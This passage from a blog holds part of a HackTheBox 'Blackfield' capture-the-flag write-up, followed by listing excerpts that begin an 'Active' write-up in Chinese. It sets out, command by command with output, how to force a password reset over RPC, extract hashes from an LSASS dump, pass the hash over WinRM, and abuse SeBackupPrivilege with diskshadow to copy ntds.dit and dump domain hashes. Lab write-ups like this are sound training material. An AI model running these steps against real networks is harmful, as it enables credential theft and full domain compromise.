<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/Desktop/hackthebox/Windows/blackfield]</span><br><span class="line">‚îî‚îÄ<span class="comment"># smbmap -H 10.10.10.192 -u support -p "#00^BlackKnight"                                                                2 ‚®Ø</span></span><br><span class="line">[+] IP: 10.10.10.192:445        Name: BLACKFIELD.<span class="built_in">local</span>                                  </span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Remote Admin</span><br><span class="line">        C$                                                      NO ACCESS       Default share</span><br><span class="line">        forensic                                                NO ACCESS       Forensic / Audit share.</span><br><span class="line">        IPC$                                                    READ ONLY       Remote IPC</span><br><span class="line">        NETLOGON                                                READ ONLY       Logon server share </span><br><span class="line">        profiles$                                               READ ONLY</span><br><span class="line">        SYSVOL                                                  READ ONLY       Logon server share </span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>Found nothing interesting </p>
<p>use rpcclient connect to rpc</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">rpcclient -U blackfield.local\\support 10.10.10.192</span><br><span class="line">rpcclient $&gt; enumdomusers</span><br><span class="line">user:[Administrator] rid:[0x1f4]</span><br><span class="line">user:[Guest] rid:[0x1f5]</span><br><span class="line">user:[krbtgt] rid:[0x1f6]</span><br><span class="line">user:[audit2020] rid:[0x44f]</span><br><span class="line">user:[support] rid:[0x450]</span><br><span class="line">user:[BLACKFIELD764430] rid:[0x451]</span><br><span class="line">user:[BLACKFIELD538365] rid:[0x452]</span><br><span class="line">user:[BLACKFIELD189208] rid:[0x453]</span><br><span class="line">user:[BLACKFIELD404458] rid:[0x454]</span><br><span class="line">user:[BLACKFIELD706381] rid:[0x455]</span><br><span class="line">user:[BLACKFIELD937395] rid:[0x456]</span><br><span class="line">...........................</span><br></pre></td></tr></tbody></table></figure>

<p>We got tons of user again.</p>
<p>After research, nothing special. But came along with a article using rpc to reset domain user password</p>
<p><a target="_blank" rel="noopener" href="https://room362.com/post/2017/reset-ad-user-password-with-linux/">Reset AD User password with Linux</a></p>
<p>Make a change to user <strong>audit2020</strong> password to Ikonw123!</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">rpcclient $&gt; setuserinfo2</span><br><span class="line">Usage: setuserinfo2 username level password [password_expired]</span><br><span class="line">result was NT_STATUS_INVALID_PARAMETER</span><br><span class="line">rpcclient $&gt; setuserinfo2 audit2020 23 Ikonw123!</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>Sadly, we still not able login using winrm but we can access <strong>audit2020</strong>‚Äòs smb share again.</p>
<p>yeah smb share againnnn.</p>
<p>This time round, forensic folder is available to us</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[/opt/nmapAutomator/10.10.10.192/nmap]</span><br><span class="line">‚îî‚îÄ<span class="comment"># smbmap -H 10.10.10.192 -u audit2020 -p Ikonw123!</span></span><br><span class="line">[+] IP: 10.10.10.192:445        Name: BLACKFIELD.<span class="built_in">local</span>                                  </span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Remote Admin</span><br><span class="line">        C$                                                      NO ACCESS       Default share</span><br><span class="line">        forensic                                                READ ONLY       Forensic / Audit share.</span><br><span class="line">        IPC$                                                    READ ONLY       Remote IPC</span><br><span class="line">        NETLOGON                                                READ ONLY       Logon server share </span><br><span class="line">        profiles$                                               READ ONLY</span><br><span class="line">        SYSVOL                                                  READ ONLY       Logon server share </span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight tap"><table><tbody><tr><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[/opt/nmapAutomator/10.10.10.192/nmap]</span><br><span class="line">‚îî‚îÄ<span class="comment"># smbclient \\\\10.10.10.192\\forensic -U audit2020                                      </span></span><br><span class="line">Enter WORKGROUP\audit2020's password: </span><br><span class="line">Try "help" to get a list of possible commands.</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D       <span class="number"> 0 </span> Sun Feb<span class="number"> 23 </span>21:03:16 2020</span><br><span class="line">  ..                                  D       <span class="number"> 0 </span> Sun Feb<span class="number"> 23 </span>21:03:16 2020</span><br><span class="line">  commands_output                     D       <span class="number"> 0 </span> Mon Feb<span class="number"> 24 </span>02:14:37 2020</span><br><span class="line">  memory_analysis                     D       <span class="number"> 0 </span> Fri May<span class="number"> 29 </span>04:28:33 2020</span><br><span class="line">  tools                               D       <span class="number"> 0 </span> Sun Feb<span class="number"> 23 </span>21:39:08 2020</span><br><span class="line"></span><br><span class="line">               <span class="number"> 7846143 </span>blocks of size 4096.<span class="number"> 3978511 </span>blocks available</span><br><span class="line">smb: \&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>Alright, it seems tons of files. Download the folder to local (If your internet connection is slow, you might also consider just mount the smb directory to local)</p>
<figure class="highlight apache"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">recurse</span> <span class="literal">ON</span></span><br><span class="line"><span class="attribute">prompt</span> <span class="literal">OFF</span></span><br><span class="line"><span class="attribute">mget</span> *</span><br></pre></td></tr></tbody></table></figure>



<blockquote>
<p>A DMP file is a file that contains data ‚Äúdumped‚Äù from a program‚Äôs memory space. It is often created when a program has an error or crashes and may also be saved by the program ‚ÄúSavedump.exe‚Äù on the first reboot after a crash. DMP files are usually named ‚ÄúMemory.dmp.‚Äù</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/skelsec/pypykatz">pypykatz</a> has the ability to parse the secrets hidden in the LSASS process, it is just something like mimikatz‚Äôs <strong>sekurlsa::</strong></p>
<figure class="highlight nginx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">pypykatz</span> lsa minidump lsass.DMP</span><br></pre></td></tr></tbody></table></figure>

<p>and we actually got the password hash for user <strong>svc_backup</strong></p>
<figure class="highlight asciidoc"><table><tbody><tr><td class="code"><pre><span class="line"><span class="section">== MSV ==</span></span><br><span class="line"><span class="code">        Username: svc_backup</span></span><br><span class="line"><span class="code">        Domain: BLACKFIELD</span></span><br><span class="line"><span class="code">        LM: NA</span></span><br><span class="line"><span class="code">        NT: 9658d1d1dcd9250115e2205d9f48400d</span></span><br><span class="line"><span class="code">        SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>No need to bruteforce, we can directly pass the hash using evil-winrm</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">‚îÄ‚îÄ(rootüíÄkali)-[/opt/nmapAutomator/10.10.10.192/nmap/memory_analysis]</span><br><span class="line">‚îî‚îÄ# evil-winrm.rb -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i 10.10.10.192   </span><br></pre></td></tr></tbody></table></figure>

<h2 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h2><p>After checking the user‚Äôs privileges, found out that <strong>SeBackupPrivilege</strong> is enabled.</p>
<blockquote>
<p><strong>SeBackupPrivilege</strong><br>Description: This privilege causes the system to grant all read access control to any file, regardless of the <a target="_blank" rel="noopener" href="https://msdn.microsoft.com/library/windows/desktop/ms721532#-security-access-control-list-gly"><em>access control list</em></a> (ACL) specified for the file.</p>
</blockquote>
<p>Firstly, I tried the <strong>vssadmin</strong>, well I don‚Äôt have the privilege</p>
<figure class="highlight subunit"><table><tbody><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users&gt; vssadmin create shadow /for=C:</span><br><span class="line">vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool</span><br><span class="line">(C) Copyright 2001<span class="string">-2013</span> Microsoft Corp.</span><br><span class="line"></span><br><span class="line"><span class="keyword">Error: </span>You don't have the correct permissions to run this command.  Please run this utility from a command</span><br><span class="line">window that has elevated administrator privileges.</span><br></pre></td></tr></tbody></table></figure>

<blockquote>
<p>Members of ‚ÄúBackup Operators‚Äù can logon locally on a Domain Controller and backup the NTDS.DIT, for ex. with: ‚Äúwbadmin.exe‚Äù or ‚Äúdiskshadow.exe</p>
</blockquote>
<p>As I read carefully, found out that diskshadow allow us to create a new shadow disk copy of the disk C and expose it as another driver</p>
<p>shadow_copy.txt</p>
<figure class="highlight gams"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> context <span class="comment">persistent nowriters</span></span><br><span class="line">add <span class="comment">volume c: alias ikonw</span></span><br><span class="line">create</span><br><span class="line">expose <span class="comment">%ikonw% z:</span></span><br></pre></td></tr></tbody></table></figure>

<p>However it has error </p>
<figure class="highlight pgsql"><table><tbody><tr><td class="code"><pre><span class="line">-&gt; <span class="keyword">set</span> context persistent nowriter  &lt;&lt;<span class="comment">--- shudnt it be nowriters?</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span> CONTEXT { CLIENTACCESSIBLE | PERSISTENT [ NOWRITERS ] | <span class="keyword">VOLATILE</span> [ NOWRITERS ] }</span><br><span class="line"></span><br><span class="line">        CLIENTACCESSIBLE        Specify <span class="keyword">to</span> <span class="keyword">create</span> shadow copies usable <span class="keyword">by</span> client versions <span class="keyword">of</span> Windows.</span><br><span class="line">        PERSISTENT              Specify that shadow <span class="keyword">copy</span> <span class="keyword">is</span> persist across program <span class="keyword">exit</span>, <span class="keyword">reset</span> <span class="keyword">or</span> reboot.</span><br><span class="line">        PERSISTENT NOWRITERS    Specify that shadow <span class="keyword">copy</span> <span class="keyword">is</span> persistent <span class="keyword">and</span> <span class="keyword">all</span> writers are excluded.</span><br><span class="line">        <span class="keyword">VOLATILE</span>                Specify that shadow <span class="keyword">copy</span> will be deleted <span class="keyword">on</span> <span class="keyword">exit</span> <span class="keyword">or</span> <span class="keyword">reset</span>.</span><br><span class="line">        <span class="keyword">VOLATILE</span> NOWRITERS      Specify that shadow <span class="keyword">copy</span> <span class="keyword">is</span> <span class="keyword">volatile</span> <span class="keyword">and</span> <span class="keyword">all</span> writers are excluded.</span><br><span class="line"></span><br><span class="line">        Example: <span class="keyword">SET</span> CONTEXT CLIENTACCESSIBLE</span><br></pre></td></tr></tbody></table></figure>

<p>Add extra character behind</p>
<figure class="highlight gams"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> context <span class="comment">persistent nowriterss</span></span><br><span class="line">add <span class="comment">volume c: alias ikonww</span></span><br><span class="line">createe</span><br><span class="line">expose <span class="comment">%ikonw% z::</span></span><br></pre></td></tr></tbody></table></figure>

<p>However one more error!!</p>
<figure class="highlight livecodeserver"><table><tbody><tr><td class="code"><pre><span class="line">The .cab metadata <span class="built_in">file</span> cannot be stored <span class="keyword">in</span> <span class="keyword">the</span> current working <span class="built_in">directory</span>, because <span class="keyword">it</span> is <span class="built_in">read</span>-only.</span><br></pre></td></tr></tbody></table></figure>

<p>ermmm, maybe I am in the <strong>document directory</strong></p>
<p>create a temp folder at <strong>C:\temp</strong></p>
<p>Finally, we successfully create the shadow disk at Z: drive</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\temp&gt; diskshadow /s shadow_copy.txt</span><br><span class="line">Microsoft DiskShadow version 1.0</span><br><span class="line">Copyright (C) 2013 Microsoft Corporation</span><br><span class="line">On computer:  DC01,  9/8/2020 5:40:45 AM</span><br><span class="line"></span><br><span class="line">-&gt; <span class="built_in">set</span> context persistent nowriters</span><br><span class="line">-&gt; add volume c: <span class="built_in">alias</span> ikonw</span><br><span class="line">-&gt; create</span><br><span class="line">Alias ikonw <span class="keyword">for</span> shadow ID {f3ecf98c-d3cb-4ffe-8dc8-b613d3ab5922} <span class="built_in">set</span> as environment variable.</span><br><span class="line">Alias VSS_SHADOW_SET <span class="keyword">for</span> shadow <span class="built_in">set</span> ID {115480f7-6f83-46ee-8ea6-4fcf8bcb1d81} <span class="built_in">set</span> as environment variable.</span><br><span class="line"></span><br><span class="line">Querying all shadow copies with the shadow copy <span class="built_in">set</span> ID {115480f7-6f83-46ee-8ea6-4fcf8bcb1d81}</span><br><span class="line"></span><br><span class="line">        * Shadow copy ID = {f3ecf98c-d3cb-4ffe-8dc8-b613d3ab5922}               %ikonw%</span><br><span class="line">                - Shadow copy <span class="built_in">set</span>: {115480f7-6f83-46ee-8ea6-4fcf8bcb1d81}       %VSS_SHADOW_SET%</span><br><span class="line">                - Original count of shadow copies = 1</span><br><span class="line">                - Original volume name: \\?\Volume{351b4712-0000-0000-0000-602200000000}\ [C:\]</span><br><span class="line">                - Creation time: 9/8/2020 5:40:45 AM</span><br><span class="line">                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2</span><br><span class="line">                - Originating machine: DC01.BLACKFIELD.<span class="built_in">local</span></span><br><span class="line">                - Service machine: DC01.BLACKFIELD.<span class="built_in">local</span></span><br><span class="line">                - Not exposed</span><br><span class="line">                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}</span><br><span class="line">                - Attributes:  No_Auto_Release Persistent No_Writers Differential</span><br><span class="line"></span><br><span class="line">Number of shadow copies listed: 1</span><br><span class="line">-&gt; expose %ikonw% z:</span><br><span class="line">-&gt; %ikonw% = {f3ecf98c-d3cb-4ffe-8dc8-b613d3ab5922}</span><br><span class="line">The shadow copy was successfully exposed as z:\.</span><br><span class="line">-&gt;</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="image-20200908134638982" data-src="/images/HTB-Blackfield-Hard/image-20200908134638982.png" class="lazyload"></p>
<p>The z: drive shadow folder permission also inherited from the C:, we dont have the permission to download the files.</p>
<p>After looking at the <a target="_blank" rel="noopener" href="https://github.com/giuliano108/SeBackupPrivilege">github page</a></p>
<blockquote>
<ul>
<li>If you want to read/copy data out of a ‚Äúnormally forbidden‚Äù folder, you have to act as a backup software. The shell <code>copy</code> command won‚Äôt work; you‚Äôll need to open the source file manually using <code>CreateFile</code> making sure to specify the <code>FILE_FLAG_BACKUP_SEMANTICS</code> flag.</li>
</ul>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll">SeBackupPrivilegeCmdLets.dll</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll">SeBackupPrivilegeUtils.dll</a></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">Evil-WinRM* PS C:\temp&gt; Import-Module .\SeBackupPrivilegeUtils.dll</span><br><span class="line">*Evil-WinRM* PS C:\temp&gt; Import-Module .\SeBackupPrivilegeCmdLets.dll</span><br><span class="line">*Evil-WinRM* PS C:\temp&gt; <span class="built_in">cd</span> z:\windows\ntds</span><br><span class="line">*Evil-WinRM* PS z:\windows\ntds&gt; Copy-FileSeBackupPrivilege ntds.dit c:\temp\ntds.dit</span><br><span class="line">*Evil-WinRM* PS z:\windows\ntds&gt; <span class="built_in">cd</span> c:\temp</span><br><span class="line">*Evil-WinRM* PS C:\temp&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\temp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-a----         9/8/2020   5:40 AM            617 2020-09-08_5-40-45_DC01.cab</span><br><span class="line">-a----         9/8/2020   5:52 AM       18874368 ntds.dit</span><br><span class="line">-a----         9/8/2020   5:50 AM          12288 SeBackupPrivilegeCmdLets.dll</span><br><span class="line">-a----         9/8/2020   5:51 AM          16384 SeBackupPrivilegeUtils.dll</span><br><span class="line">-a----         9/8/2020   5:40 AM             88 shadow_copy.txt</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>and we got the ntds.dit files. download to kali</p>
<p>and use <strong>secretsdump</strong> ,I just realize still need a extra system hive file.</p>
<figure class="highlight nsis"><table><tbody><tr><td class="code"><pre><span class="line">reg save <span class="params">HKLM</span>\<span class="params">SYSTEM</span> c:\temp\<span class="params">system</span>.hive</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/Desktop/hackthebox/Windows/blackfield]</span><br><span class="line">‚îî‚îÄ<span class="comment"># python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ntds.dit -system system.hive -hashes lmhash:nthash LOCAL -outputfile hash | more</span></span><br><span class="line">Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation</span><br><span class="line">[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Searching <span class="keyword">for</span> pekList, be patient</span><br><span class="line">[*] PEK <span class="comment"># 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c</span></span><br><span class="line">[*] Reading and decrypting hashes from ntds.dit </span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DC01$:1000:aad3b435b51404eeaad3b435b51404ee:65557f7ad03ac340a7eb12b9462f80d6:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::</span><br><span class="line">audit2020:1103:aad3b435b51404eeaad3b435b51404ee:c95ac94a048e7c29ac4b4320d7c9d3b5:::</span><br><span class="line">support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::</span><br></pre></td></tr></tbody></table></figure>

<p>and we got the administrator hash, use evil-winrm to login and we got root!</p>
<br>
<br>
<br>


<p><img src="/images/placeholder.png" alt="root" data-src="/images/root.gif" class="lazyload"></p>

		  	  
	</div>



	<div class="article-categories">
	 
      <i class="iconfont icon-category" style="margin-right:4px"></i>
	  	            
				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
		
      
	</div>
	

	<div class="article-tags">
		
			<i class="iconfont icon-tags" style="margin-right:4px"></i>
			            
				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
			            
				<a class="link" href="/tags/hard/">hard</a>           
			
		
	</div>

	<div class="article-bottom">
		<a class="readmore" href="/2020/06/10/HTB-BlackField/">Continue</a> 	
	</div>	
    
</article>

	
	
	
	

<article class="article">		
	   
	<div class="article-header">
	    
		<a class="title" href="/2020/05/12/HTB-cache/">HTB Cache Writeup</a>  
	       
		 

		<div class="meta">
			<time>May 12, 2020</time>			
		</div>
	</div>


	

    
	<div class="typo article-excerpt">	
		
			<p>Cache writeup available</p>
		  	  
	</div>



	<div class="article-categories">
	 
      <i class="iconfont icon-category" style="margin-right:4px"></i>
	  	            
				<a class="link" href="/categories/HackTheBox-Medium/">HackTheBox-Medium</a>           
		
      
	</div>
	

	<div class="article-tags">
		
			<i class="iconfont icon-tags" style="margin-right:4px"></i>
			            
				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
			
		
	</div>

	<div class="article-bottom">
		<a class="readmore" href="/2020/05/12/HTB-cache/">Continue</a> 	
	</div>	
    
</article>

	
	
	
	

<article class="article">		
	   
	<div class="article-header">
	    
		<a class="title" href="/2020/02/10/HTB-Active/">HTB Active Writeup</a>  
	       
		 

		<div class="meta">
			<time>Feb 10, 2020</time>			
		</div>
	</div>


	

    
	<div class="typo article-excerpt">	
		 
			<p>ÊîªÂáªÊú∫ÔºöÂÆòÊñπKali linux 2019 64‰Ωç<br>‰ΩúËÄÖÔºö<strong>Ikonw</strong></p>
<h1 id="Èù∂Êú∫‰ªãÁªç"><a href="#Èù∂Êú∫‰ªãÁªç" class="headerlink" title="Èù∂Êú∫‰ªãÁªç"></a>Èù∂Êú∫‰ªãÁªç</h1><p><img src="/images/placeholder.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞" data-src="/images/old-machine-images/20200210210254278.png" class="lazyload"></p>
<h1 id="‰∏ÄÔºåÁ´ØÂè£Êâ´Êèè"><a href="#‰∏ÄÔºåÁ´ØÂè£Êâ´Êèè" class="headerlink" title="‰∏ÄÔºåÁ´ØÂè£Êâ´Êèè"></a>‰∏ÄÔºåÁ´ØÂè£Êâ´Êèè</h1><p>ËøôËæπÊàëÁî®ÁöÑÊòØÊàëÂú®OSCPÊó∂ÂÄôÁî®ÁöÑ‰∏Ä‰∏™ËÑöÊú¨Â∑•ÂÖ∑ÔºàÊáíÊÉ∞Ôºâ</p>
<p><a target="_blank" rel="noopener" href="https://github.com/21y4d/nmapAutomator">nmapAutomator</a><br><img src="/images/placeholder.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞" data-src="/images/old-machine-images/202002102107263.png" class="lazyload"></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">./nmapAutomator.sh 10.10.10.100 Full</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p>Èô§‰∫Ü53Âíå445Âπ∂Ê≤°Êúâ‰ªÄ‰πàÁâπÂà´ËÉΩ‰∫§‰∫íÁöÑÁ´ØÂè£</p>
<figure class="highlight less"><table><tbody><tr><td class="code"><pre><span class="line"><span class="selector-tag">Starting</span> <span class="selector-tag">Nmap</span> <span class="number">7.80</span> ( <span class="attribute">https</span>:<span class="comment">//nmap.org ) at 2020-02-10 18:56 +08</span></span><br><span class="line">Nmap scan report for <span class="number">10.10</span>.<span class="number">10.100</span></span><br><span class="line">Host is up (<span class="number">0.23s</span> latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line"><span class="number">53</span>/tcp    open  domain        Microsoft DNS <span class="number">6.1</span>.<span class="number">7601</span> (<span class="number">1</span>DB15D39) (Windows Server <span class="number">2008</span> R2 SP1)</span><br><span class="line">| <span class="attribute">dns-nsid</span>: </span><br><span class="line">|_  bind.<span class="attribute">version</span>: Microsoft DNS <span class="number">6.1</span>.<span class="number">7601</span> (<span class="number">1</span>DB15D39)</span><br><span class="line"><span class="number">88</span>/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server <span class="attribute">time</span>: <span class="number">2020</span>-<span class="number">02</span>-<span class="number">10</span> <span class="number">10</span>:<span class="number">57</span>:<span class="number">27</span>Z)</span><br><span class="line"><span class="number">135</span>/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">139</span>/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line"><span class="number">389</span>/tcp   open  ldap          Microsoft Windows Active Directory LDAP (<span class="attribute">Domain</span>: active.htb, <span class="attribute">Site</span>: Default-First-Site-Name)</span><br><span class="line"><span class="number">445</span>/tcp   open  microsoft-ds?</span><br><span class="line"><span class="number">464</span>/tcp   open  kpasswd5?</span><br><span class="line"><span class="number">593</span>/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP <span class="number">1.0</span></span><br><span class="line"><span class="number">636</span>/tcp   open  tcpwrapped</span><br><span class="line"><span class="number">3268</span>/tcp  open  ldap          Microsoft Windows Active Directory LDAP (<span class="attribute">Domain</span>: active.htb, <span class="attribute">Site</span>: Default-First-Site-Name)</span><br><span class="line"><span class="number">3269</span>/tcp  open  tcpwrapped</span><br><span class="line"><span class="number">5722</span>/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">9389</span>/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line"><span class="number">47001</span>/tcp open  http          Microsoft HTTPAPI httpd <span class="number">2.0</span> (SSDP/UPnP)</span><br><span class="line">|<span class="attribute">_http-server-header</span>: Microsoft-HTTPAPI/<span class="number">2.0</span></span><br><span class="line">|<span class="attribute">_http-title</span>: <span class="keyword">Not</span> Found</span><br><span class="line"><span class="number">49152</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49153</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49154</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49155</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49157</span>/tcp open  ncacn_http    Microsoft Windows RPC over HTTP <span class="number">1.0</span></span><br><span class="line"><span class="number">49158</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49169</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49171</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49182</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service <span class="attribute">Info</span>: <span class="attribute">Host</span>: DC; <span class="attribute">OS</span>: Windows; <span class="attribute">CPE</span>: <span class="attribute">cpe</span>:/<span class="attribute">o</span>:<span class="attribute">microsoft</span>:<span class="attribute">windows_server_2008</span>:<span class="attribute">r2</span>:sp1, <span class="attribute">cpe</span>:/<span class="attribute">o</span>:<span class="attribute">microsoft</span>:windows</span><br><span class="line"></span><br><span class="line">Host script <span class="attribute">results</span>:</span><br><span class="line">|<span class="attribute">_clock-skew</span>: <span class="number">38s</span></span><br><span class="line">| <span class="attribute">smb2-security-mode</span>: </span><br><span class="line">|   <span class="number">2.02</span>: </span><br><span class="line">|_    Message signing enabled <span class="keyword">and</span> required</span><br><span class="line">| <span class="attribute">smb2-time</span>: </span><br><span class="line">|   <span class="attribute">date</span>: <span class="number">2020</span><span class="attribute">-02-10T10</span>:<span class="number">58</span>:<span class="number">25</span></span><br><span class="line">|_  <span class="attribute">start_date</span>: <span class="number">2020</span><span class="attribute">-02-10T08</span>:<span class="number">17</span>:<span class="number">06</span></span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at <span class="attribute">https</span>:<span class="comment">//nmap.org/submit/ .</span></span><br><span class="line">Nmap <span class="attribute">done</span>: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned in <span class="number">194.25</span> seconds</span><br><span class="line"></span><br><span class="line"><span class="number">12345678910111213141516171819202122232425262728293031323334353637383940414243444546</span></span><br></pre></td></tr></tbody></table></figure>

<h1 id="‰∏ÄÔºåSMB-ENUMERATION"><a href="#‰∏ÄÔºåSMB-ENUMERATION" class="headerlink" title="‰∏ÄÔºåSMB ENUMERATION"></a>‰∏ÄÔºåSMB ENUMERATION</h1><p>È¶ñÂÖà ‰ΩøÁî®smbmap Êù•Á°ÆÂÆöanonymousÁî®Êà∑ÁöÑÊùÉÈôêÔºàÂ¶ÇÊûúÊúâÂÜôÊùÉÈôêÂèØ‰ª•Áõ¥Êé•Áî®impacket Êù•Ëé∑ÂèñshellÔºâ</p>
<figure class="highlight nginx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">smbmap</span> -H <span class="number">10.10.10.100</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>

<p>ÂèëÁé∞ÂØπ <strong>Replication</strong> Êñá‰ª∂Â§π <strong>READ ONLY</strong>ÊùÉÈôê<br><img src="/images/placeholder.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞" data-src="/images/old-machine-images/20200210211447140.png" class="lazyload"><br>ÔºàËøôÈáåÊàëÊú¨Êù•ÊÉ≥‰ΩøÁî®mountÊåÇËΩΩsmb, ‰ΩÜÂ§±Ë¥•‰∫Ü„ÄÇÊúâÊàêÂäüÁöÑÂèØ‰ª•Âú®ËØÑËÆ∫ÂëäËØâÊàë„ÄÇÔºâ</p>
<p>‰ΩøÁî® smbclientËøõË°åËøûÊé• <strong>Replication</strong></p>
<figure class="highlight taggerscript"><table><tbody><tr><td class="code"><pre><span class="line">smbclient <span class="symbol">\\</span><span class="symbol">\\</span>10.10.10.100<span class="symbol">\\</span>Replication</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p>ÂèëÁé∞‰∏§‰∏™ÊúâÊÑèÊÄùÁöÑÊñá‰ª∂Â§π</p>
<figure class="highlight apache"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">31B2F340</span>-<span class="number">016</span>D-<span class="number">11</span>D2-<span class="number">945</span>F-<span class="number">00</span>C04FB984F9 ÊòØDefault admin policy</span><br><span class="line"><span class="attribute">6AC1786C</span>-<span class="number">016</span>F-<span class="number">11</span>D2-<span class="number">945</span>F-<span class="number">00</span>C04fB984F9 ÊòØDefault domain polices</span><br><span class="line"><span class="attribute">12</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞" data-src="/images/old-machine-images/2020021021181611.png" class="lazyload"><br>Â¶ÇÊûúÊ≤°ËÆ∞ÈîôÁöÑËØù windows server 2012‰ª•‰∏ãÁöÑÁâàÊú¨ ‰ºöÊääÂØÜÁ†ÅÂÇ®Â≠òÂú®GPO„ÄÇ<br>ÁªèËøá‰∏ÄÁï™Êü•Êâæ<br><strong>smb: \active.htb\Policies{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups</strong></p>
<p>Âú®Ê≠§ÁõÆÂΩïÂèëÁé∞Groups.xml</p>
